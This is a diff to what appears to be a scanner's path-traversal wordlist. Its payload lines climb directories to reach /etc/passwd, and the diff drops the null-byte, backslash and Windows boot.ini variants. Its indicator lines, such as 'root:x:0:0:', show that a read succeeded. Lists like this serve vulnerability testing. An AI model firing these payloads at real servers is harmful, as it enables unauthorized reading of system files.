@@ -1,9 +1,4 @@
 # Payloads
-/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd
-.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
-..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00
-%00../../../../../../etc/passwd
-%00/etc/passwd%00
 ../../etc/passwd
 ../../../etc/passwd
 ../../../../etc/passwd
@@ -14,18 +9,8 @@
 ../../../../../../../../../etc/passwd
 ../../../../../../../../../../etc/passwd
 ../../../../../../../../../../../etc/passwd
-../../../../../../../../../../../../etc/passwd
-../../../../../../../../../../../../../etc/passwd
-../../../../../../../../../../../../../../etc/passwd
 
 # Indicators
 root:x:0:0:
-nobody:x:65534:
-
-# Payloads
-C:/boot.ini
-C:\boot.ini
-
-# Indicators
-[boot loader]
-timeout=30
+bin:x:1:1:
+daemon:x:2:2:
